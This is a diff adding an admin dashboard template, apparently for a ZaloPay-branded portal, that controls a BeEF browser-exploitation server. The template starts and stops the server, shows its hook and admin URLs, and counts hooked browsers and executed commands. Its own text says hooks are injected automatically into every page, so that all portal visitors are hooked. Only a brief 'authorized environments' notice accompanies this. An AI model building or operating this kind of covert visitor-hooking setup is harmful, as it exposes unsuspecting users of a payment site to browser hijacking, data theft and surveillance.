@@ -1,0 +1,309 @@
+{% extends "admin/base.html" %}
+
+{% block title %}BeEF Management - ZaloPay Admin{% endblock %}
+
+{% block content %}
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header">
+                    <h3 class="card-title">
+                        <i class="fas fa-shield-alt"></i>
+                        BeEF (Browser Exploitation Framework) Management
+                    </h3>
+                </div>
+                <div class="card-body">
+                    <!-- BeEF Status -->
+                    <div class="row mb-4">
+                        <div class="col-md-6">
+                            <div class="info-box">
+                                <span class="info-box-icon bg-info">
+                                    <i class="fas fa-server"></i>
+                                </span>
+                                <div class="info-box-content">
+                                    <span class="info-box-text">BeEF Server Status</span>
+                                    <span class="info-box-number" id="beef-status">
+                                        {% if beef_running %}
+                                            <span class="badge badge-success">Running</span>
+                                        {% else %}
+                                            <span class="badge badge-danger">Stopped</span>
+                                        {% endif %}
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="info-box">
+                                <span class="info-box-icon bg-warning">
+                                    <i class="fas fa-link"></i>
+                                </span>
+                                <div class="info-box-content">
+                                    <span class="info-box-text">Hook URL</span>
+                                    <span class="info-box-number" id="hook-url">
+                                        {% if beef_running %}
+                                            {{ beef_status.hook_url }}
+                                        {% else %}
+                                            Not Available
+                                        {% endif %}
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Control Buttons -->
+                    <div class="row mb-4">
+                        <div class="col-12">
+                            <div class="btn-group" role="group">
+                                <button type="button" class="btn btn-success" id="start-beef-btn" onclick="startBeef()">
+                                    <i class="fas fa-play"></i> Start BeEF
+                                </button>
+                                <button type="button" class="btn btn-danger" id="stop-beef-btn" onclick="stopBeef()">
+                                    <i class="fas fa-stop"></i> Stop BeEF
+                                </button>
+                                <button type="button" class="btn btn-info" onclick="refreshStatus()">
+                                    <i class="fas fa-sync"></i> Refresh Status
+                                </button>
+                                <a href="#" id="admin-panel-link" class="btn btn-primary" target="_blank">
+                                    <i class="fas fa-external-link-alt"></i> Open BeEF Admin Panel
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- BeEF Configuration -->
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h4 class="card-title">Configuration</h4>
+                                </div>
+                                <div class="card-body">
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>Host:</strong></td>
+                                            <td id="beef-host">{{ beef_status.host if beef_running else 'N/A' }}</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Port:</strong></td>
+                                            <td id="beef-port">{{ beef_status.port if beef_running else 'N/A' }}</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Admin URL:</strong></td>
+                                            <td id="admin-url">
+                                                {% if beef_running %}
+                                                    <a href="{{ beef_status.admin_url }}" target="_blank">{{ beef_status.admin_url }}</a>
+                                                {% else %}
+                                                    N/A
+                                                {% endif %}
+                                            </td>
+                                        </tr>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h4 class="card-title">Integration Status</h4>
+                                </div>
+                                <div class="card-body">
+                                    <div class="alert alert-info">
+                                        <h5><i class="icon fas fa-info"></i> Auto Hook Injection</h5>
+                                        BeEF hooks are automatically injected into all HTML responses when the server is running.
+                                        Visitors to the ZaloPay portal will be automatically hooked.
+                                    </div>
+                                    <div class="alert alert-warning">
+                                        <h5><i class="icon fas fa-exclamation-triangle"></i> Security Notice</h5>
+                                        This is a penetration testing tool. Use only in authorized environments.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- BeEF Statistics (if running) -->
+                    <div class="row" id="beef-stats" style="display: none;">
+                        <div class="col-12">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h4 class="card-title">BeEF Statistics</h4>
+                                    <button class="btn btn-sm btn-info float-right" onclick="refreshStats()">
+                                        <i class="fas fa-sync"></i> Refresh
+                                    </button>
+                                </div>
+                                <div class="card-body">
+                                    <div class="row">
+                                        <div class="col-md-3">
+                                            <div class="info-box">
+                                                <span class="info-box-icon bg-success">
+                                                    <i class="fas fa-globe"></i>
+                                                </span>
+                                                <div class="info-box-content">
+                                                    <span class="info-box-text">Hooked Browsers</span>
+                                                    <span class="info-box-number" id="hooked-browsers">0</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-3">
+                                            <div class="info-box">
+                                                <span class="info-box-icon bg-primary">
+                                                    <i class="fas fa-terminal"></i>
+                                                </span>
+                                                <div class="info-box-content">
+                                                    <span class="info-box-text">Total Commands</span>
+                                                    <span class="info-box-number" id="total-commands">0</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-3">
+                                            <div class="info-box">
+                                                <span class="info-box-icon bg-warning">
+                                                    <i class="fas fa-clock"></i>
+                                                </span>
+                                                <div class="info-box-content">
+                                                    <span class="info-box-text">Pending Commands</span>
+                                                    <span class="info-box-number" id="pending-commands">0</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-3">
+                                            <div class="info-box">
+                                                <span class="info-box-icon bg-danger">
+                                                    <i class="fas fa-check"></i>
+                                                </span>
+                                                <div class="info-box-content">
+                                                    <span class="info-box-text">Completed Commands</span>
+                                                    <span class="info-box-number" id="completed-commands">0</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+$(document).ready(function() {
+    refreshStatus();
+    
+    // Auto refresh every 30 seconds
+    setInterval(refreshStatus, 30000);
+});
+
+function startBeef() {
+    $('#start-beef-btn').prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> Starting...');
+    
+    $.ajax({
+        url: '/api/beef/start',
+        method: 'POST',
+        success: function(response) {
+            if (response.success) {
+                toastr.success('BeEF server started successfully');
+                refreshStatus();
+            } else {
+                toastr.error('Failed to start BeEF server: ' + response.message);
+            }
+        },
+        error: function(xhr) {
+            toastr.error('Error starting BeEF server');
+        },
+        complete: function() {
+            $('#start-beef-btn').prop('disabled', false).html('<i class="fas fa-play"></i> Start BeEF');
+        }
+    });
+}
+
+function stopBeef() {
+    $('#stop-beef-btn').prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> Stopping...');
+    
+    $.ajax({
+        url: '/api/beef/stop',
+        method: 'POST',
+        success: function(response) {
+            if (response.success) {
+                toastr.success('BeEF server stopped successfully');
+                refreshStatus();
+            } else {
+                toastr.error('Failed to stop BeEF server: ' + response.message);
+            }
+        },
+        error: function(xhr) {
+            toastr.error('Error stopping BeEF server');
+        },
+        complete: function() {
+            $('#stop-beef-btn').prop('disabled', false).html('<i class="fas fa-stop"></i> Stop BeEF');
+        }
+    });
+}
+
+function refreshStatus() {
+    $.ajax({
+        url: '/api/beef/status',
+        method: 'GET',
+        success: function(response) {
+            if (response.success) {
+                updateStatus(response.status);
+            }
+        },
+        error: function(xhr) {
+            console.error('Error getting BeEF status');
+        }
+    });
+}
+
+function updateStatus(status) {
+    if (status.running) {
+        $('#beef-status').html('<span class="badge badge-success">Running</span>');
+        $('#hook-url').text(status.hook_url);
+        $('#beef-host').text(status.host);
+        $('#beef-port').text(status.port);
+        $('#admin-url').html('<a href="' + status.admin_url + '" target="_blank">' + status.admin_url + '</a>');
+        $('#admin-panel-link').attr('href', status.admin_url);
+        $('#start-beef-btn').prop('disabled', true);
+        $('#stop-beef-btn').prop('disabled', false);
+        $('#beef-stats').show();
+        refreshStats();
+    } else {
+        $('#beef-status').html('<span class="badge badge-danger">Stopped</span>');
+        $('#hook-url').text('Not Available');
+        $('#beef-host').text('N/A');
+        $('#beef-port').text('N/A');
+        $('#admin-url').text('N/A');
+        $('#admin-panel-link').attr('href', '#');
+        $('#start-beef-btn').prop('disabled', false);
+        $('#stop-beef-btn').prop('disabled', true);
+        $('#beef-stats').hide();
+    }
+}
+
+function refreshStats() {
+    // Proxy request to BeEF API through our integration
+    $.ajax({
+        url: '/api/beef/proxy/api/stats',
+        method: 'GET',
+        success: function(response) {
+            if (response.success && response.stats) {
+                $('#hooked-browsers').text(response.stats.server.online_browsers || 0);
+                $('#total-commands').text(response.stats.commands.total || 0);
+                $('#pending-commands').text(response.stats.commands.pending || 0);
+                $('#completed-commands').text(response.stats.commands.completed || 0);
+            }
+        },
+        error: function(xhr) {
+            console.error('Error getting BeEF stats');
+        }
+    });
+}
+</script>
+{% endblock %}
+
